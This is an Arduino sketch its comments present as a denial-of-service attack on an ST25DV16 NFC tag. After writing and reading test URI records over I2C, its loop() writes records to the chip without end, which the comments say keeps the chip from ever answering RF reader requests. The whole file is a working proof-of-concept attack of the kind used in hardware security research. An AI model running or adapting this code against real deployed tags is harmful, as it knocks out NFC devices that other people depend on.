// ST25DV16 DoS Attack via exploting the
// I2C arbitration.

#include "ST25DVSensor.h"
#define SerialPort      Serial


#define GPO_PIN A1
#define LPD_PIN A2
#define SDA_PIN D4
#define SCL_PIN D5

#define WireNFC Wire // Default wire instance

String uri_read;
const char uri_write_protocol[] = URI_ID_0x01_STRING; // Uri protocol to write in the tag
int count = 0;
void setup() {
  const char uri_write_message[] = "st.com/st25";       // Uri message to write in the tag
  String uri_write = String(uri_write_protocol) + String(uri_write_message);
  const char uri_write_message2[] = "Hello world!";
  const char uri_write_protocol2[] = URI_ID_0x14_STRING;
  String uri_write2 = String (uri_write_protocol2) + String(uri_write_message2);

  // Initialize serial for output.
  SerialPort.begin(115200);

  // The wire instance used can be omited in case you use default Wire instance
  if (st25dv.begin(GPO_PIN, LPD_PIN, &WireNFC) == 0) {
    SerialPort.println("System Init done!");
  } else {
    SerialPort.println("System Init failed!");
    while (1);
  }

  if (st25dv.writeURI(uri_write_protocol, uri_write_message, "")) {
    SerialPort.println("Write failed!");
    while (1);
  }
  if (st25dv.writeURI(uri_write_protocol2, uri_write_message2, "/hello?")) {
    SerialPort.println("Write failed!");
    while (1);
  }
  //delay(100);

  if (st25dv.readURI(&uri_read)) {
    SerialPort.println("Read failed!");
    while (1);
  }

  SerialPort.println(uri_read.c_str());

  if (strcmp(uri_read.c_str(), uri_write.c_str()) == 0) {
    SerialPort.println("Successfully written and read!");
  } else {
    SerialPort.println("Read bad string!");
  }
}

void loop() {
  //empty loop
  count = count + 1;
  //endlessly write records to Area 1, Record 0 via I2C.
  st25dv.writeURI(uri_write_protocol, String(count), "");
  //This forces the chip to never respond to an RFD request.
}
